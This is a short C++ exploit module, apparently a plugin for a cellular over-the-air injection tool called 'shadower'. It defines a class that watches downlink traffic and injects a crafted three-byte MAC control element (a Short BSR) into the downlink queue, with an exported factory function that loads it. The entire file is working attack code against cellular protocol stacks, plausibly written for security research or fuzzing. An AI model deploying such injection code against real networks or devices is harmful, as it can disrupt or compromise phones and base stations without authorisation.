#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

uint8_t raw_mac_ce[] = {0x3d, 0x2f, 0x3f};

class MAC_CE_ShortBSR : public Exploit
{
public:
  MAC_CE_ShortBSR(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                  SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    mac_ce_msg.reset(new std::vector<uint8_t>(raw_mac_ce, raw_mac_ce + sizeof(raw_mac_ce)));
  }

  void setup() override {}

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == direction_t::DL) {
      if (buffer[0] != raw_mac_ce[0] && buffer[1] != raw_mac_ce[1] && buffer[2] != raw_mac_ce[2]) {
        logger.info("Received an Downlink message, sending the MAC CE");
        dl_buffer_queue.push(mac_ce_msg);
      }
    }
  }

private:
  std::shared_ptr<std::vector<uint8_t> > mac_ce_msg;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MAC_CE_ShortBSR(dl_buffer_queue_, ul_buffer_queue_);
}
}